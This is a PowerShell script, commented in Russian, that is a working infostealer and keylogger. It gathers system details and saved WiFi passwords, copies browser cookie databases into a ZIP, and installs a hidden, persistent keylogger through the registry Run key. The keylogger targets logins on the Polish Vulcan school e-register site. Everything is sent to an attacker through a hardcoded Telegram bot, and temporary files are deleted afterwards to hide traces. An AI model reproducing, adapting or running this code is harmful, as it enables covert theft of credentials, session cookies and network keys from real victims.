# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# ПРОСТОЙ И РАБОЧИЙ КЕЙЛОГГЕР С ТАЙМЕРОМ
$keyloggerStatus = "Starting..."

# Создаем простой и надежный кейлоггер
$keyloggerScript = @"
Add-Type -AssemblyName System.Windows.Forms

# Глобальные переменные
`$global:buffer = ""
`$global:monitoringActive = `$false
`$global:monitorEndTime = `$null
`$global:lastSendTime = Get-Date
`$global:lastCheckTime = Get-Date

function Send-Telegram {
    param(`$text)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$text
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
    } catch { }
}

function Get-CurrentBrowserTitle {
    try {
        # Получаем все процессы браузеров с заголовками окон
        `$browsers = @("chrome", "firefox", "msedge", "edge", "iexplore", "opera", "brave", "vivaldi")
        
        foreach (`$browser in `$browsers) {
            `$processes = Get-Process -Name `$browser -ErrorAction SilentlyContinue | Where-Object { 
                `$_.MainWindowTitle -ne "" -and `$_.MainWindowHandle -ne 0
            }
            
            if (`$processes) {
                # Сортируем по времени CPU чтобы найти активное окно
                `$activeProcess = `$processes | Sort-Object CPU -Descending | Select-Object -First 1
                return `$activeProcess.MainWindowTitle
            }
        }
    } catch { }
    return ""
}

function Check-VulcanSite {
    `$title = Get-CurrentBrowserTitle
    if (-not `$title -or `$title -eq "") { 
        return `$false 
    }
    
    # Ключевые слова для определения сайтов Vulcan
    `$vulcanKeywords = @(
        "vulcan", "uonetplus", "uonet+", "dziennik", "minrol", "rybnik",
        "logowanie", "login", "account", "edu.gdynia", "eszkola",
        "uonetplus.vulcan.net.pl", "vulcan.net.pl"
    )
    
    `$titleLower = `$title.ToLower()
    
    # Проверяем конкретные URL
    `$targetUrls = @(
        "https://uonetplus.vulcan.net.pl/minrol",
        "https://uonetplus.vulcan.net.pl/rybnik", 
        "https://uonetplus.vulcan.net.pl/"
    )
    
    foreach (`$url in `$targetUrls) {
        if (`$titleLower.Contains(`$url.ToLower())) {
            return `$true
        }
    }
    
    # Проверяем ключевые слова
    foreach (`$keyword in `$vulcanKeywords) {
        if (`$titleLower.Contains(`$keyword)) {
            return `$true
        }
    }
    
    return `$false
}

function Start-Monitoring {
    `$global:monitoringActive = `$true
    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
    `$currentTitle = Get-CurrentBrowserTitle
    Send-Telegram "🎯 VULCAN SITE DETECTED! 
📱 Site: `$currentTitle
⏰ Monitoring started for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
}

function Stop-Monitoring {
    `$global:monitoringActive = `$false
    `$global:monitorEndTime = `$null
    if (`$global:buffer -ne "") {
        Send-Telegram "📝 FINAL INPUT: `$global:buffer"
        `$global:buffer = ""
    }
    Send-Telegram "⏹️ Monitoring stopped - 2 minutes elapsed"
}

function Process-Key {
    param(`$key)
    
    # Обработка специальных клавиш
    switch (`$key.ToString()) {
        "Return" { 
            if (`$global:buffer -ne "") {
                Send-Telegram "↵ ENTER: `$global:buffer"
                `$global:buffer = ""
            }
        }
        "Space" { 
            `$global:buffer += " " 
        }
        "Back" { 
            if (`$global:buffer.Length -gt 0) {
                `$global:buffer = `$global:buffer.Substring(0, `$global:buffer.Length - 1)
            }
        }
        "Tab" { 
            `$global:buffer += "[TAB]"
            Send-Telegram "↹ TAB: `$global:buffer"
            `$global:buffer = ""
        }
        "Escape" {
            `$global:buffer = ""
        }
        "LButton" {
            # При клике мыши отправляем накопленные данные
            if (`$global:buffer -ne "") {
                Send-Telegram "🖱️ CLICK: `$global:buffer"
                `$global:buffer = ""
            }
        }
        "RButton" {
            if (`$global:buffer -ne "") {
                Send-Telegram "🖱️ RIGHT CLICK: `$global:buffer"
                `$global:buffer = ""
            }
        }
        default {
            # Обработка обычных символов
            if (`$key -ge [System.Windows.Forms.Keys]::A -and `$key -le [System.Windows.Forms.Keys]::Z) {
                `$isShift = ([System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::Shift)
                `$isCaps = [System.Console]::CapsLock
                
                if ((`$isShift -and -not `$isCaps) -or (-not `$isShift -and `$isCaps)) {
                    `$global:buffer += `$key.ToString()
                } else {
                    `$global:buffer += `$key.ToString().ToLower()
                }
            }
            elseif (`$key -ge [System.Windows.Forms.Keys]::D0 -and `$key -le [System.Windows.Forms.Keys]::D9) {
                `$isShift = ([System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::Shift)
                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                if (`$isShift) {
                    `$global:buffer += `$symbols[`$key - [System.Windows.Forms.Keys]::D0]
                } else {
                    `$global:buffer += (`$key - [System.Windows.Forms.Keys]::D0).ToString()
                }
            }
            else {
                # Специальные символы
                switch (`$key) {
                    "OemPeriod" { `$global:buffer += "." }
                    "Oemcomma" { `$global:buffer += "," }
                    "OemMinus" { `$global:buffer += "-" }
                    "Oemplus" { `$global:buffer += "=" }
                    "OemQuestion" { `$global:buffer += "/" }
                    "Oemtilde" { `$global:buffer += "`"" }
                    "OemOpenBrackets" { `$global:buffer += "[" }
                    "OemCloseBrackets" { `$global:buffer += "]" }
                    "OemPipe" { `$global:buffer += "\" }
                    "OemSemicolon" { `$global:buffer += ";" }
                    "OemQuotes" { `$global:buffer += "'" }
                    "D1" { `$global:buffer += "1" }
                    "D2" { `$global:buffer += "2" }
                    "D3" { `$global:buffer += "3" }
                    "D4" { `$global:buffer += "4" }
                    "D5" { `$global:buffer += "5" }
                    "D6" { `$global:buffer += "6" }
                    "D7" { `$global:buffer += "7" }
                    "D8" { `$global:buffer += "8" }
                    "D9" { `$global:buffer += "9" }
                    "D0" { `$global:buffer += "0" }
                }
            }
        }
    }
    
    # Автоотправка при длинном вводе
    if (`$global:buffer.Length -gt 25) {
        Send-Telegram "📝 AUTO: `$global:buffer"
        `$global:buffer = ""
    }
}

# Запускаем мониторинг
Send-Telegram "🔍 VULCAN KEYLOGGER STARTED 
🎯 Target sites:
• https://uonetplus.vulcan.net.pl/minrol
• https://uonetplus.vulcan.net.pl/rybnik  
• https://uonetplus.vulcan.net.pl/
⏰ Will monitor for 2 minutes after detection"

while (`$true) {
    try {
        `$currentTime = Get-Date
        
        # Проверяем сайт Vulcan каждые 3 секунды (чтобы не нагружать систему)
        if ((`$currentTime - `$global:lastCheckTime).TotalSeconds -ge 3) {
            `$global:lastCheckTime = `$currentTime
            
            if (Check-VulcanSite) {
                if (-not `$global:monitoringActive) {
                    Start-Monitoring
                } else {
                    # Обновляем время окончания если снова обнаружили сайт
                    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
                }
            }
        }
        
        # Если мониторинг активен - перехватываем клавиши
        if (`$global:monitoringActive) {
            # Проверяем таймер
            if ((Get-Date) -gt `$global:monitorEndTime) {
                Stop-Monitoring
            } else {
                # Перехват клавиш
                for (`$i = 8; `$i -le 255; `$i++) {
                    `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                    if (`$keyState -eq -32767) {
                        `$key = [System.Windows.Forms.Keys]`$i
                        Process-Key -key `$key
                    }
                }
                
                # Автоотправка каждые 15 секунд
                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(15)) {
                    if (`$global:buffer -ne "") {
                        Send-Telegram "⏰ TIMEOUT: `$global:buffer"
                        `$global:buffer = ""
                    }
                    `$global:lastSendTime = Get-Date
                }
            }
        }
        
        Start-Sleep -Milliseconds 50
    } catch {
        # Продолжаем работу при ошибках
        Start-Sleep -Milliseconds 1000
    }
}
"@

# Сохраняем и запускаем кейлоггер
try {
    $keyloggerPath = "$env:TEMP\vulcan_monitor.ps1"
    $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
    
    # Запускаем в отдельном процессе
    $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"" -PassThru
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
    Set-ItemProperty -Path $startupPath -Name "VulcanMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ KEYLOGGER ACTIVE - Monitoring specific Vulcan sites for 2 minutes"
    
} catch {
    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Cookies - создаем ZIP архив для удобной загрузки
$cookies = @()
$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"

New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Копируем файлы cookies
$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
)

foreach ($browser in $browsers) {
    if ($browser.Path -and (Test-Path $browser.Path)) {
        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookies += $dest
            # Создаем текстовую информацию о файле
            $fileInfo = Get-Item $dest
            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
            $cookies += "$temp\$($browser.Name)_info.txt"
        }
    }
}

# Создаем ZIP архив с cookies
try {
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
        if (Test-Path $zipPath) {
            $cookies += $zipPath
        }
    }
} catch {}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== KEYLOGGER STATUS ===
$keyloggerStatus

=== TARGET SITES ===
• https://uonetplus.vulcan.net.pl/minrol
• https://uonetplus.vulcan.net.pl/rybnik
• https://uonetplus.vulcan.net.pl/

=== MONITORING MODE ===
• Автоматически включается при обнаружении целевых сайтов
• Работает 2 минуты после обнаружения
• Перехватывает ВСЕ нажатия клавиш в этот период

=== BROWSER COOKIES ===
Found cookies files: $($cookies.Count)
Files available for download as ZIP archive

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Отправка ZIP архива с cookies
if (Test-Path $zipPath) {
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
            chat_id = '5674514050'
            document = [System.IO.File]::OpenRead($zipPath)
            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
        }
    } catch {
        # Если не удалось отправить ZIP, отправляем файлы по отдельности
        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                    chat_id = '5674514050'
                    document = [System.IO.File]::OpenRead($_)
                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
                }
            } catch {}
        }
    }
} else {
    # Отправка отдельных файлов если ZIP не создался
    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($_)
                caption = "Cookies file: $(Split-Path $_ -Leaf)"
            }
        } catch {}
    }
}

# Очистка
Start-Sleep 2
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
